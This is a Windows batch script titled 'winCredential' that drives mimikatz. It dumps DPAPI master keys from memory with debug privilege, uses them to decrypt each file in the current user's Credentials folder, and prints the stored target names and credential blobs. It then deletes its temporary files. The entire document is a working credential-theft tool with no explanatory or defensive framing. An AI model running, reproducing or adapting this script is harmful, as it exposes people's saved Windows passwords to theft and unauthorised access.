@echo off&setlocal enabledelayedexpansion
title winCredential
chcp 65001 >nul
mimikatz "privilege::debug" "sekurlsa::dpapi" exit >tta
for /F  %%i in ('dir /b  /a:a C:\Users\%username%\AppData\Local\Microsoft\Credentials') do (
 mimikatz "dpapi::cred /in:C:\Users\%username%\AppData\Local\Microsoft\Credentials\%%i" exit | findstr  "guidMasterKey">tmp
 for /F  "tokens=2 delims=:" %%y in (tmp) do (
	for /F  "tokens=1 delims=:" %%z in ('findstr /N %%y tta') do  ( set /a ff=%%z+2)
	for /f "delims="  %%o in ('findstr /n .* tta') do (
    for /f "tokens=1,3 delims=:" %%a in ("%%o") do (
		if "%%a" equ "!ff!"  ( 
			set key=%%b
		)
   )
  
)
 mimikatz "dpapi::cred /in:C:\Users\%username%\AppData\Local\Microsoft\Credentials\%%i   /masterkey:!key:~1,500!" exit | findstr "TargetName CredentialBlob"
 echo --------------------------------------------------------------------------------
)
)
@del /s /q tmp >nul
@del /s /q tta >nul
@pause